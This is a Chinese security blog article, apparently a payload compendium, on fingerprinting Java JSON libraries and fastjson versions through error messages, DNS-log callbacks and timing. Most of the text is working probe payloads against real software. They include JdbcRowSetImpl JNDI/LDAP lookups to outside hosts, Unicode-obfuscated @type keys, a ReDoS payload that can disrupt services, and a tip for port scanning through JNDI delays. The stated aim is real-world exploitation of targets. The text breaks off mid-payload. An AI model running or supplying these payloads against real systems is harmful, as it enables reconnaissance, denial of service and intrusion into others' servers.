# 零、写在前面的话

## 0.1 前言
在我刚接触`Java`安全的时候，我写过一篇零基础入门级别的文章：
> 【两万字原创长文】完全零基础入门Fastjson系列漏洞（基础篇）
> https://mp.weixin.qq.com/s/SOKLC_No0hV9RhAavF2hcw

现在距离这篇文章的写作时间已经过去整整半年，该写写他的提高篇了。基础篇发布后，很多师傅在朋友圈发表了留言，有不少师傅提出了宝贵而真挚的建议，也有师傅（@Y1ngSec、@lenihaoa）指出我文章的不足，我在此再次表示诚挚的感谢。
后来我在准备写fastjson漏洞利用提高篇的时候发现，网上的一些payload总结要么是东一块西一块很零散，要么就是没有经过仔细的校对（一些`payload`的注释的利用范围明显是错的，另一些给出的`payload`本身就是错的），要么就是说明很简短，让新手看了一头雾水不知道具体出现什么情况才是正确的。
为了方便自己平时查阅利用，也为了尽量修复以上的问题，我写下了这篇文章。不过需要注意的是，这篇文章是总结性质的，是从`1`到`n`的，并非从`0`到`1`，所有我参考过的文章我都会列在文章末尾以表示感谢。
## 0.2 准备工作
我这里大部分直接使用`safe6Sec`师傅制作的复现环境（如果需要使用其他的靶场我会单独说明）：
```json
git clone https://github.com/safe6Sec/ShiroAndFastJson.git
```
我修改了`IndexController.java`文件中的`parse`函数，方便我查看解析结果或者解析报错内容：
```java
@PostMapping("/json")
@ResponseBody
public JSONObject parse(@RequestBody String data) {
    JSONObject jsonObject = new JSONObject();
    try {
        jsonObject.put("status", 0);
        jsonObject.put("message", String.valueOf(JSON.parse(data)));
    } catch (Exception e) {
        jsonObject.put("status", -1);
        jsonObject.put("error", e.getMessage());
    }
    return jsonObject;
}
```
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697540726015-d45f1340-b5a7-44ca-b694-1c0f3d15a811.png#averageHue=%2325282b&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=udc76540a&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=301629&status=done&style=none&taskId=u09926218-8720-40c7-9239-9fcce6bce8b&title=&width=1920)
接下来，如果不做特别说明的话，我都是向`json`接口进行`post`请求`payload`。
# 一、判断所使用的Json库
需要注意的是，以下大部分都是在没有报错返回的情况下利用的方法，个别的我会做出说明。
## 1.1 Fastjson
### 1.1.1 dnslog判断法
`payload1`：
```json
{"@type":"java.net.InetSocketAddress"{"address":,"val":"rtpmognpiy.dgrh3.cn"}}
```
`payload2`：
```json
{{"@type":"java.net.URL","val":"http://qvhkmkgcta.dgrh3.cn"}:"a"}
```
如果以上`payload`正常返回并受到`dnslog`请求，说明目标使用的是`fastjson`框架。
### 1.1.2 解析判断法
`payload3`：
```json
{"ext":"blue","name":{"$ref":"$.ext"}}
```
如果解析成功，那么说明目标使用的是`fastjson`：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697540959912-337438c6-5b71-414e-94cc-612623a4e8ec.png#averageHue=%23b9dfd2&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=uc0fc0b31&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145062&status=done&style=none&taskId=ubc06db6e-e04f-4295-8e37-2e217a5e3db&title=&width=1920)
至于这个下面的这个`payload4`，需要根据具体环境参数来修改，不可直接使用：
```json
{"a":new a(1),"b":x'11',/*\*\/"c":Set[{}{}],"d":"\u0000\x00"}
```
本意就是如果能对上面的参数的值自动解析，说明使用了`fastjson`组件：
![图片来源：Kcon2022——Hacking JSON（作者：浅蓝）](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697541887709-38d4d786-4755-4d98-a5a8-7e376c72e3df.png#averageHue=%23e9efec&clientId=u69b9a195-ec36-4&from=paste&height=156&id=u21780bf9&originHeight=156&originWidth=742&originalType=binary&ratio=1&rotation=0&showTitle=true&size=25818&status=done&style=none&taskId=ub3941896-64a1-49ef-aec0-295285b22f5&title=%E5%9B%BE%E7%89%87%E6%9D%A5%E6%BA%90%EF%BC%9AKcon2022%E2%80%94%E2%80%94Hacking%20JSON%EF%BC%88%E4%BD%9C%E8%80%85%EF%BC%9A%E6%B5%85%E8%93%9D%EF%BC%89&width=742 "图片来源：Kcon2022——Hacking JSON（作者：浅蓝）")
`payload5`：
```json
{"@type": "whatever"}
```
如果对方的代码写的是像我这样显示报错内容的话，可以通过这个来判断（出现`autoType is not support. whatever`说明使用了`fastjson`），但是一般不会，所以实战中基本上用不到：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697542076802-0694ae22-6768-4e6f-9885-4466f07c7550.png#averageHue=%23b7dfd1&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=u20cef85f&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145663&status=done&style=none&taskId=u98603be8-d040-4fc0-a77a-6ed802839a8&title=&width=1920)
## 1.2 jackson
### 1.2.1 浮点类型精度丢失判断法
如果对方传入的参数中存在一个`double`类型的（比如说年龄），我们就可以利用这个方法来判断。
正常传参：
```json
{"score": 1}
```
`payload6`：
```json
{"score": 1.1111111111111111111111111111111111111111111111111111111111111}
```
如果返回结果是类似`1.1111111111111112`这种，那么就说明使用的可能是`jackson`（`fastjson`如果不加`Feature.UseBigDecimal`这个参数，也会丢失精度；`gson`也是会丢失精度的；因此可以继续利用前面的`payload`来进一步区分`fastjson`、`jackson`和`gson`）：![jackson在处理浮点类型参数的时候会丢失精度](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697549490530-4fa687f7-76fd-432e-8d0f-afce3b131b74.png#averageHue=%23232529&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=u2872faf9&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=true&size=161462&status=done&style=none&taskId=u4e802135-a8ea-45ec-a696-9475cb745e0&title=jackson%E5%9C%A8%E5%A4%84%E7%90%86%E6%B5%AE%E7%82%B9%E7%B1%BB%E5%9E%8B%E5%8F%82%E6%95%B0%E7%9A%84%E6%97%B6%E5%80%99%E4%BC%9A%E4%B8%A2%E5%A4%B1%E7%B2%BE%E5%BA%A6&width=1920 "jackson在处理浮点类型参数的时候会丢失精度")
![fastjson在处理浮点类型的时候也会丢失精度](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697549549245-2340cfc4-8b93-4c2a-9f29-8b84d3d3ae3e.png#averageHue=%2325262a&clientId=u69b9a195-ec36-4&from=paste&height=992&id=ub8479b3d&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=true&size=136161&status=done&style=none&taskId=u859d2352-b1c3-40d0-994e-068021f9d4e&title=fastjson%E5%9C%A8%E5%A4%84%E7%90%86%E6%B5%AE%E7%82%B9%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%97%B6%E5%80%99%E4%B9%9F%E4%BC%9A%E4%B8%A2%E5%A4%B1%E7%B2%BE%E5%BA%A6&width=1384 "fastjson在处理浮点类型的时候也会丢失精度")
![gson在处理浮点类型的时候同样会丢失精度](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697549819838-1fdb9a0c-7698-46cc-9ce1-2492d641d975.png#averageHue=%2325272a&clientId=u69b9a195-ec36-4&from=paste&height=992&id=ubccc4cd3&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=true&size=127859&status=done&style=none&taskId=u65b36645-57f5-4530-8887-e3ee6a8ff66&title=gson%E5%9C%A8%E5%A4%84%E7%90%86%E6%B5%AE%E7%82%B9%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%97%B6%E5%80%99%E5%90%8C%E6%A0%B7%E4%BC%9A%E4%B8%A2%E5%A4%B1%E7%B2%BE%E5%BA%A6&width=1384 "gson在处理浮点类型的时候同样会丢失精度")
### 1.2.2 注释符判断法
`payload7`：
```json
{"age": 1}/*#W01fh4cker
```
如果不报错，说明使用的是`jackson`：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697543171591-f5c0027c-f84f-48e9-b5b5-d7f0db8ae7a2.png#averageHue=%23232529&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=u99635f23&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=163567&status=done&style=none&taskId=u9a36304b-cae4-4f94-b869-76f903ad846&title=&width=1920)
### 1.2.3 单引号判断法
正常传参：
```json
{"username": "admin", "password": "admin"}
```
`payload8`：
```json
{"username": 'admin', "password": 'admin'}
```
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697544009906-9bad6a16-0b2b-4598-801d-4b0ad565b904.png#averageHue=%23242529&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=ufb283f90&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=219705&status=done&style=none&taskId=uc43eedd5-d00f-48f4-955e-8db9fe0009e&title=&width=1920)
如果改成单引号，报错如上，那么就是`jackson`。`fastjson`是不报错的：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697544048660-2a37b9de-6569-4cc9-9cc3-d5b8b1c87e39.png#averageHue=%23b9ded2&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=u31772062&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145377&status=done&style=none&taskId=u56e460e6-abe8-414b-88b5-aa890b4df72&title=&width=1920)
### 1.2.4 多余类成员判断法
正常传参：
```json
{"username": "admin", "password": "admin"}
```
`payload9`：
```json
{"username": "admin", "password": "admin", "test": 1}
```
如果报错如下，则说明是`jackson`：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697544312292-a17f7621-fc7f-4028-a5cd-e1a63e0e3f7b.png#averageHue=%23242629&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=ub08a225a&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=222546&status=done&style=none&taskId=u6ed65d9f-1a6f-4fef-8eb9-7d2f4b19fc9&title=&width=1920)
`fastjson`是不会报错的，这里我们请求`doLogin`路由来验证：
```
POST /doLogin?username=admin&password=admin&test=1&rememberme=remember-me HTTP/1.1
Host: 10.0.47.4:8888
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=8D9951E527FEE008DB7B874D70636D86
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
```
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697544672589-eee6d2bc-a7df-4f66-89ab-99590634a1b2.png#averageHue=%23baded0&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=ua370b3d3&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=184387&status=done&style=none&taskId=u8157a4fc-0a8b-456b-af73-d5be2f49a95&title=&width=1920)
## 1.3 gson
### 1.3.1 浮点类型精度丢失判断法
在`1.2.1`中我们已经讨论过了，在此不做赘述。
### 1.3.2 注释符判断法
`payload10`：
```json
#\r\n{"score":1.1}
```
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697550058040-f1690b7f-4993-443b-b09a-4e57ab2db864.png#averageHue=%2325272a&clientId=u69b9a195-ec36-4&from=paste&height=992&id=uf5e19cda&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=134128&status=done&style=none&taskId=u36bf66d3-8ade-406d-b9cf-60a67fac957&title=&width=1384)
正常说明为`gson`。
## 1.4 org.json
`payload11`：
```json
{"username": '\r', "password": "admin"}
```
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697555502210-cb38c246-d8b3-4d0c-a7db-53562c8c59e6.png#averageHue=%2325262a&clientId=u69b9a195-ec36-4&from=paste&height=992&id=u90bf9fe5&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=147265&status=done&style=none&taskId=u5bd33566-365a-4a09-936b-6d2af21c252&title=&width=1384)
出现如上报错，说明使用的是`org.json`，这个就需要能看到报错的内容了。
## 1.5 hutool.json
`payload12`：
```json
{a:whatever}/*\r\nxxx
```
如果返回正确（最好是能看到返回的值为`{"a":"whatever"}`），说明使用的是`hutool.json`：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697595373959-32ac6d62-ce8d-4d97-ab37-d6b20e96eb0d.png#averageHue=%2324262a&clientId=u69b9a195-ec36-4&from=paste&height=992&id=u38b02b3f&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=109633&status=done&style=none&taskId=u1768bfba-7943-417b-9144-eb37b256095&title=&width=1384)
# 二、判断fastjson版本
## 2.1 有报错信息返回的情况
开发人员如果对异常信息处理不当，就给了我们有机可乘的机会，以下是一些常用的在有报错信息返回的情况下的判断`fastjson`版本的方法。
`payload13`：
```json
{"@type":"java.lang.AutoCloseable"
```
`payload14`：
```json
["test":1]
```
这里我们使用浅蓝师傅的靶场：
> https://github.com/iSafeBlue/fastjson-autotype-bypass-demo

![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697596695598-5dc4f9e0-f515-4950-b5bc-ad69df246cd3.png#averageHue=%23badfd2&clientId=u69b9a195-ec36-4&from=paste&height=1040&id=uc6648245&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=153544&status=done&style=none&taskId=u7a490bcd-e3b4-42c6-a596-64f4c923336&title=&width=1920)
需要说明的是，该payload只适用于
至于`["test":1]`这个`payload`，我在该靶场没有测试成功；我后来自己写了个`demo`，测试成功，大家也可以自行测试：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697597964794-71903969-dead-4833-b40b-a4adadf1909b.png#averageHue=%23badfd3&clientId=u6d8481a3-cb12-4&from=paste&height=1040&id=u804ad308&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=151970&status=done&style=none&taskId=uf1199f02-6476-4a66-8672-5dea038c7c7&title=&width=1920)
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697597976629-72ff8a75-acf1-485c-aa61-ec20de230b09.png#averageHue=%2325272a&clientId=u6d8481a3-cb12-4&from=paste&height=992&id=u1c297afe&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=186879&status=done&style=none&taskId=u13b889bd-3840-4d0e-b0bb-c276a819ff2&title=&width=1384)
对于`payload13`的报错情况，我们还可以细分。如果代码在写的时候几乎没有做任何异常处理（这种情况挺少见的），那么我们根据报错的代码出错点很快就可以判断出对方使用的是`parseObject`还是`parse`来处理数据的；否则我们只能根据有限的返回的报错信息来判断：
### 2.1.1 JSON.parseObject(jsondata, User.class)
#### 2.1.1.1 判断1.1.15<=version<=1.1.26
报错：
```
syntax error, expect {, actual EOF
```
#### 2.1.1.2 判断1.1.27<=version<=1.2.11
报错会显示错误的行数：
```
syntax error, expect {, actual EOF, pos 9
```
#### 2.1.1.3 判断1.2.12<=version<=1.2.24
报错：
```
type not match
```
#### 2.1.1.4 判断1.2.25<=version<=2.0.1
报错（后面接具体的类）：
```
type not match. java.lang.AutoCloseable -> org.example.Main$User
```
其中，`fastjson2`以后，都会多一处报错，后面的情况也是一样的：
```
Caused by: com.alibaba.fastjson2.JSONException...
```
#### 2.1.1.5 判断2.0.1<=version<=2.0.5.graal以及2.0.9<=version<=2.0.12
报错**类似**如下：
```
error, offset 35, char 
```
#### 2.1.1.6 判断2.0.6<=version<=2.0.7
报错：
```
illegal character 
```
#### 2.1.1.7 判断2.0.8以及2.0.13<=version<=2.0.40（我写这篇文章的时候的最新版本）
报错内容中会直接显示当前版本的版本号，很方便：
```
illegal character , offset 35, character , line 1, column 35, fastjson-version 2.0.8 {"@type":"java.lang.AutoCloseable"
```
### 2.1.2 JSON.parse(jsonData);
#### 2.1.2.1 判断1.1.15<=version<=1.1.26
报错：
```
syntax error, expect {, actual EOF
```
#### 2.1.2.2 判断1.1.27<=version<=1.2.32
报错类似如下：
```
syntax error, expect {, actual EOF, pos 0
```
#### 2.1.2.3 判断1.2.33<=version<=2.0.40
报错中都会直接显示版本号：
`fastjson1`中显示如下：
```
syntax error, expect {, actual EOF, pos 0, fastjson-version 1.2.83
```
`fastjson2`中显示如下：
```
Illegal syntax: , offset 34, character  , line 1, column 35, fastjson-version 2.0.40 {"@type":"java.lang.AutoCloseable"
```
但是需要注意的是`1.2.76<=version<=1.2.80`的时候，显示的版本都是`1.2.76`，原因是作者写死在代码里了，我提了个`issue`（[https://github.com/alibaba/fastjson/issues/4451](https://github.com/alibaba/fastjson/issues/4451)）：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697618848395-642fa169-5385-4c04-bd1b-ee3bce7012ac.png#averageHue=%2325282c&clientId=u81795203-7cb4-4&from=paste&height=1040&id=u4cdec35e&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=293083&status=done&style=none&taskId=u8b5f4fc1-3eba-41d0-b33f-3c8e221d49a&title=&width=1920)
## 2.2 dnslog判断法
**特别说明：**
`dns`能出网并不代表存在`fastjson`漏洞！！！
另外，讨论`1.2.24`以前的版本没什么意义，因此基本不会在下文中涉及。
### 2.2.1 判断1.1.15<=version<=1.2.24
正常传参：
```json
{"name":"admin","email":"admin","content":"admin"}
```
`payload15`：
```json
{"name":"admin","email":"admin","content":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://aclarecpsj.dgrh3.cn/POC","autoCommit":true}}
```
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697619264576-2e2ed9d4-6f80-4b17-b686-f3bce4c8ec9e.png#averageHue=%23badfd2&clientId=u81795203-7cb4-4&from=paste&height=1040&id=ua241762b&originHeight=1040&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=148036&status=done&style=none&taskId=ud96661cb-8c5c-4ea5-a734-613b9258fca&title=&width=1920)
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697619284000-8dfe2807-a838-4e5e-9bf0-217f92de81ee.png#averageHue=%23fcfbfa&clientId=u81795203-7cb4-4&from=paste&height=382&id=u524a0f15&originHeight=382&originWidth=1562&originalType=binary&ratio=1&rotation=0&showTitle=false&size=41988&status=done&style=none&taskId=u729d1f8b-78d3-4a09-9966-e63b3765f4d&title=&width=1562)
### 2.2.2 判断1.2.37<=version<=1.2.83
`payload16`：
```json
{{"@type":"java.net.URL","val":"http://rpdmvyfajp.dgrh3.cn"}:"aaa"}
```
### 2.2.3 判断1.2.9<=version<=1.2.47
`payload17`：
```json
{"username":{"@type":"java.net.InetAddress","val":"bjmgclhjrs.dgrh3.cn"}, "password":"admin"}
```
需要注意，有时候会报错如下，但是`dnslog`仍然会收到请求，这个是目标服务器的问题，多试就可以了：
```json
deserialize inet adress error
```
### 2.2.4 判断1.2.10<=version<=1.2.47
`payload18`：
```json
[{"@type":"java.lang.Class","val":"java.io.ByteArrayOutputStream"},{"@type":"java.io.ByteArrayOutputStream"},{"@type":"java.net.InetSocketAddress"{"address":,"val":"6m2csu.dnslog.cn"}}]
```
除非对方有以下代码，否则`1.2.47`以后的版本都会报错：
```java
ParserConfig.getGlobalInstance().addAccept("java.lang.Class");
ParserConfig.getGlobalInstance().addAccept("java.io.ByteArrayOutputStream");
```
### 2.2.5 判断1.2.9<=version<=1.2.36
`payload19`：
```json
{"@type":"com.alibaba.fastjson.JSONObject", {"@type": "java.net.URL", "val":"http://tbqnrzguzp.dgrh3.cn"}}""}
```
如果不报错、`dnslog`**无响应**，说明版本处于`1.2.9`至`1.2.36`。
### 2.2.6 判断1.2.37<=version<=1.2.83
还是上面的`payload19`，如果`dnslog`有响应，说明处于`1.2.37`和`1.2.83`之间。
### 2.2.7 判断1.2.9<=version<=1.2.83
`payload20`：
```json
Set[{"@type":"java.net.URL","val":"http://wobfyhueao.dgrh3.cn"}]
```
### 2.2.8 判断version≠(1.2.24 || 1.2.83)
`payload21`：
```json
{"page":{"pageNumber":1,"pageSize":1,"zero":{"@type":"java.lang.Exception","@type":"org.XxException"}}}
```
只有`1.2.25<=version<=1.2.80`的时候会报错，其他情况包括`1.1`和`2.0`的版本都是不会报错的。
### 2.2.9 判断1.2.69<=version<=1.2.83
`payload22`：
```json
{"page":{"pageNumber":1,"pageSize":1,"zero":{"@type":"java.lang.AutoCloseable","@type":"java.io.ByteArrayOutputStream"}}}
```
如果报错（`autoType is not support. java.io.ByteArrayOutputStream`），说明版本处于`1.2.69`和`1.2.83`之间；如果不报错，说明处于`1.2.24`到`1.2.68`之间。
### 2.2.10 判断1.2.48<=version<=1.2.83
`payload23`：
```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl"}}
```
大部分情况下，如果报错，说明版本处于`1.2.48`到`1.2.83`，但是有时候也可能因为环境本身而出现奇奇怪怪的问题，比如我这里`1.2.24`也报错，只是报错内容不同：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697703633490-9f435328-7ac1-4515-8f91-4a94c97b7c73.png#averageHue=%23a2d8d9&clientId=u34d78b8a-7ddf-4&from=paste&height=372&id=u2e91eb2a&originHeight=372&originWidth=1605&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65084&status=done&style=none&taskId=u2ceb68f6-1e9a-4c39-9fe0-2453bec032a&title=&width=1605)
`1.2.47`也报错，报错内容和前两者都不同：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697703695192-601d75c5-1724-4df6-9235-1d27fd47cf41.png#averageHue=%239ad2d7&clientId=u34d78b8a-7ddf-4&from=paste&height=380&id=u7169d84c&originHeight=380&originWidth=1597&originalType=binary&ratio=1&rotation=0&showTitle=false&size=69691&status=done&style=none&taskId=uc4b29973-f076-4a4f-9495-d0bbe9180d8&title=&width=1597)
由于我们不知道报错的详细信息，因此感觉不能作为一个精确判断的方法。
我后来又拿之前的`demo`进行测试，发现符合结论，师傅们利用的时候须要注意。
### 2.2.11 判断version=1.2.24
`payload24`：
```json
{"zero": {"@type": "com.sun.rowset.JdbcRowSetImpl"}}
```
按照`@kezibei`师傅给出的结论，这个`payload`只有`1.2.24`是不报错的，但是我本地靶场环境`1.2.24`也报错，只是和其他版本的不同：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697704021739-d8fec65a-b8bc-4201-b64f-56cb8723e454.png#averageHue=%23ecf0f4&clientId=u34d78b8a-7ddf-4&from=paste&height=296&id=u6e337228&originHeight=296&originWidth=1200&originalType=binary&ratio=1&rotation=0&showTitle=false&size=46515&status=done&style=none&taskId=u233fb43a-207d-42df-a900-9d38c12463a&title=&width=1200)
我又拿`demo`测试了下，发现符合结论：
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697704047772-9cfb3fc3-20d8-4d4c-bf7d-7d3a9232c40a.png#averageHue=%2326282c&clientId=u34d78b8a-7ddf-4&from=paste&height=992&id=u4ee28521&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=224646&status=done&style=none&taskId=u5ddf9776-2a2e-4dc2-851e-3ffc5a32705&title=&width=1384)
![image.png](https://w01fh4cker-img-bed.oss-cn-hangzhou.aliyuncs.com/1697704069421-15951e43-7b5b-4daf-b9dd-3381c173cd0e.png#averageHue=%2326282b&clientId=u34d78b8a-7ddf-4&from=paste&height=992&id=ubd201ec0&originHeight=992&originWidth=1384&originalType=binary&ratio=1&rotation=0&showTitle=false&size=171331&status=done&style=none&taskId=u683a3cd5-c184-47b5-b303-7ed3460c624&title=&width=1384)
## 2.3 延迟判断法
### 2.3.1 浅蓝正则ddos探测法：1.2.36<=version<=1.2.63_noneautotype
`payload25`：
```json
{"regex":{"$ref":"$[blue rlike '^[a-zA-Z]+(([a-zA-Z ])?[a-zA-Z]*)*$']"},"blue":"aaa!"}
```
该`payload`慎用，可能会影响业务系统，实战中应当逐步加`a`，不要一上来就输入一堆`a`。有延迟，说明版本处于`1.2.36`和`1.2.63_noneautotype`之间。
尽管需要慎用，但是该`payload`的魅力还是很大的，一旦成功说明该系统很有可能可以拿下该系统权限。
### 2.3.2 jndi请求延迟探测法
**Tips：**
可以在`ldap://ip`后面加上端口，这样就可以探测内外端口开放情况了，类似`ssrf`。
#### 2.3.2.1 判断1.2.4<=version<=1.2.47
`payload26`（组合拳）：
```json
{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://1.2.3.4/test111","autoCommit":true}}
```
```json
{"name":{"\u0040\u0074\u0079\u0070\u0065":"\u006a\u0061\u0076\u0061\u002e\u006c\u0061\u006e\u0067\u002e\u0043\u006c\u0061\u0073\u0073","\u0076\u0061\u006c":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c"},"x":{"\u0040\u0074\u0079\u0070\u0065":"\u0063\u006f\u006d\u002e\u0073\u0075\u006e\u002e\u0072\u006f\u0077\u0073\u0065\u0074\u002e\u004a\u0064\u0062\u0063\u0052\u006f\u0077\u0053\u0065\u0074\u0049\u006d\u0070\u006c","\u0064\u0061\u0074\u0061\u0053\u006f\u0075\u0072\u0063\u0065\u004e\u0061\u006d\u0065":"ldap://127.0.0.1/test111","autoCommit":true}}
```
先用第一个，再用第二个，如果第一个响应时间很长，而第二个较短，则说明版本：
![用时21秒](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697705261887-a3d305c7-12f2-4e20-b529-5ec3cfe66d03.png#averageHue=%238cc5e3&clientId=u34d78b8a-7ddf-4&from=paste&height=468&id=u71d1df33&originHeight=468&originWidth=1596&originalType=binary&ratio=1&rotation=0&showTitle=true&size=92406&status=done&style=none&taskId=u861ddf84-fd1a-4815-bff6-928e3eb4c00&title=%E7%94%A8%E6%97%B621%E7%A7%92&width=1596 "用时21秒")
![用时2秒](https://cdn.nlark.com/yuque/0/2023/png/25360791/1697705242447-39abdb46-d477-40f6-809b-7661a5430e49.png#averageHue=%23edf0f4&clientId=u34d78b8a-7ddf-4&from=paste&height=560&id=udfb6489c&originHeight=560&originWidth=1598&originalType=binary&ratio=1&rotation=0&showTitle=true&size=94557&status=done&style=none&taskId=uecea3486-3d52-4a9e-bad9-2609b12c95d&title=%E7%94%A8%E6%97%B62%E7%A7%92&width=1598 "用时2秒")
#### 2.3.2.2 判断1.1.16<=version<=1.2.24
`payload27`（组合拳）：
```json
{"username":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC","autoCommit":true}}
```
```json
{"username":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC","autoCommit":true}}
```
和`payload26`一样，如果下面的比上面的响应快说明版本处于`1.1.16`和`1.2.24`之间；`1.1.15`我本地测试的时候响应很快但是报错`Duplicate field name "matchColumn_asm_prefix__" with signature "[C" in class file Fastjson_ASM_JdbcRowSetImpl_1`。
#### 2.3.2.3 变种：判断1.1.16<=version<=1.2.11
如果对方用的是`JSON.parseObject`，那么`payload27`还有变种。
`payload28`（组合拳）：
```json
{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC", "autoCommit":true}}""}
```
```json
{"@type":"com.alibaba.fastjson.JSONObject",{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC", "autoCommit":true}}""}
```
如果下面比上面响应快，说明版本处于`1.1.16`和`1.2.11`之间。
#### 2.3.2.4 判断1.2.28<=version<=1.2.47
`payload29`（组合拳）：
```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://1.2.3.4/POC","autoCommit":true}}
```
```json
{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1/POC","autoCommit":true}}
```
如果下面比上面响应快，说明版本处于`1.2.28`和`1.2.47`之间。
#### 2.3.2.5 变种：判断1.2.9<=version<=1.2.11
如果对方用的是`JSON.parseObject`，那么`payload29`还有变种。
`payload30`（组合拳）：
```json
